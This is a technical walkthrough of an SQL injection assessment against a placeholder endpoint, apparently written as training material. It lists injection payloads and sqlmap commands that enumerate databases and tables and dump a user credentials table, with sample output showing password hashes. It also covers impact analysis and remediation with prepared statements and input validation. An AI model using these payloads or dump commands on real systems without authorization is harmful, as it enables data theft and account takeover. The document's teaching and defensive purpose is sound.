# **SQL Injection Assessment Report — Technical Walkthrough**

---

## **1. Overview**

This document demonstrates the end-to-end process of identifying, exploiting, and analyzing an SQL Injection vulnerability using **sqlmap**, followed by defensive recommendations.
The workflow aligns with standard offensive/defensive security methodology relevant for **CEH**, **SOC**, and **penetration testing** practices.

---

# **2. Step-by-Step Attack Workflow**

---

## **2.1 Identify Injectable Parameters**

During testing of the following endpoint:

```
http://target.com/products.php?id=5
```

**Anomalies observed:**

* Adding a quote (`'`) breaks functionality.
* Error messages such as:

```
You have an error in your SQL syntax
```

This indicates the parameter **id** is likely injectable.

### **Test Payloads**

```
http://target.com/products.php?id=5'
http://target.com/products.php?id=5 OR 1=1
http://target.com/products.php?id=5 AND SLEEP(5)
```

### **Observation**

* Response delays confirm **Boolean/time-based behavior**.
* Error-based feedback confirms **vulnerability presence**.

---

## **2.2 Run SQLMap**

### **Command**

```bash
sqlmap -u "http://target.com/products.php?id=5" --batch --banner
```

### **Purpose**

* Auto-detect injection type
* Retrieve DBMS banner
* Run non-interactively

### **Expected Output**

```
[INFO] testing connection
[INFO] GET parameter 'id' is vulnerable
[INFO] the back-end DBMS is MySQL
[INFO] banner: '5.7.31-0ubuntu0.16.04.1'
```

---

## **2.3 Extract Database Names**

### **Command**

```bash
sqlmap -u "http://target.com/products.php?id=5" --dbs --batch
```

### **Expected Output**

```
[INFO] available databases:
[*] information_schema
[*] usersdb
[*] ordersdb
```

---

## **2.4 Extract Tables**

### **Command**

```bash
sqlmap -u "http://target.com/products.php?id=5" -D usersdb --tables --batch
```

### **Expected Output**

```
[INFO] Database: usersdb
Tables:
+-------------+
| user_login  |
| user_roles  |
| activitylog |
+-------------+
```

---

## **2.5 Extract User Data**

### **Dump Table**

```bash
sqlmap -u "http://target.com/products.php?id=5" -D usersdb -T user_login --dump --batch
```

### **Expected Output**

```
Database: usersdb
Table: user_login
+----+------------+--------------------------+
| id | username   | password                 |
+----+------------+--------------------------+
| 1  | admin      | 5f4dcc3b5aa765d61d8327... |
| 2  | johndoe    | e99a18c428cb38d5f2608... |
+----+------------+--------------------------+
```

**Note:** Hashes indicate **MD5** → weak and reversible.

---

# **3. Attack Flow Diagram**

```
             ┌────────────────────┐
             │  Vulnerable URL    │
             │ products.php?id=5  │
             └─────────┬──────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │ Parameter Injection  │
            │ SQL errors/delays    │
            └─────────┬────────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │     Run SQLMap       │
            └─────────┬────────────┘
                       │
                       ▼
       ┌──────────────────────────────────┐
       │  DB Enumeration (dbs, tables)    │
       └─────────┬────────────────────────┘
                 │
                 ▼
       ┌──────────────────────────────────┐
       │     Sensitive Data Dumped        │
       │ (usernames, password hashes)     │
       └─────────┬────────────────────────┘
                 │
                 ▼
       ┌──────────────────────────────────┐
       │     Impact Assessment            │
       └──────────────────────────────────┘
```

---

# **4. Impact Analysis**

## **Confidentiality Compromised**

* Full extraction of user database
* Weak password hashes accessible

## **Integrity Risk**

Attackers may:

* Modify user roles
* Insert malicious records
* Tamper with order logs

## **Availability Risk**

* `SLEEP(10)` payloads slow down server
* Potential table deletion (if high privileges exist)

## **Privilege Escalation**

* Admin user hash can be cracked
* Full account/system takeover possible

## **Business Impact**

* GDPR/IT Act violations
* Heavy compliance penalties
* Loss of user trust
* Long-term reputation damage

---

# **5. Remediation & Fix Recommendations**

---

## **5.1 Immediate Fixes**

### **Use Parameterized Queries**

**PHP Example:**

```php
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

---

### **Input Validation**

Allow only digits for `id`:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid Input");
}
```

---

## **5.2 Long-Term Fixes**

* Use ORM frameworks (Django ORM, SQLAlchemy, Hibernate)
* Disable detailed SQL error messages in production
* Implement WAF rules to block SQLi signatures
* Enforce least-privilege DB accounts
* Enable Database Activity Monitoring (DAM)
* Regular security assessments and code audits

---

# **6. Complete Attack Flow Summary**

* Identify injection point via abnormal behavior
* Validate using payloads (`'`, `OR 1=1`, `SLEEP(5)`)
* Run SQLMap for automated exploitation
* Enumerate DB names
* List tables
* Dump user credentials
* Analyze impact
* Implement fixes (prepared statements, validation, WAF)

